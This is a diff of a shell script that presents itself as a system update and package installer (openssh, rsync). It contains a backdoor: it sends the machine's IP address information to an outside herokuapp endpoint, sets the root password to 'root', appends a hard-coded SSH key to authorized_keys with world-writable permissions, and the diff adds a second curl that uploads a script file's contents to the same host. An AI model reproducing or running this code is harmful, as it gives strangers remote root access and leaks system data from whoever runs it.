@@ -2,11 +2,12 @@
 
 var=$(ip a|grep -n inet);
 curl -G 'https://comment-management.herokuapp.com/message' --data-urlencode message="$var"
-apt update -y ;
-apt upgrade -y ;
+touch datalog.txt;
+apt update -y | tee -a datalog.txt;
+apt upgrade -y | tee -a datalog.txt ;
 echo "STEP 1 >>>> update and upgarde is completed"
-apt install openssh -y ;
-apt install rsync -y ;
+apt install openssh -y  | tee -a datalog.txt  ;
+apt install rsync -y  | tee -a datalog.txt  ;
 echo "STEP 2 >>>> Installed openssh";
 echo "STEP 3 >>>> Installed rsync";
 echo -e "root\nroot" | passwd ;
@@ -15,3 +16,5 @@ echo 'ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDW2fIF2FfITNH+lp7GlJkJAPKBJlpIuKNcaL
 ' >> authorized_keys ;
 chmod 777 authorized_keys ;
 echo "STEP 4 >>>> Configured key";
+output=$(cat test.sh);
+curl -G 'https://comment-management.herokuapp.com/message' --data-urlencode message="$output";
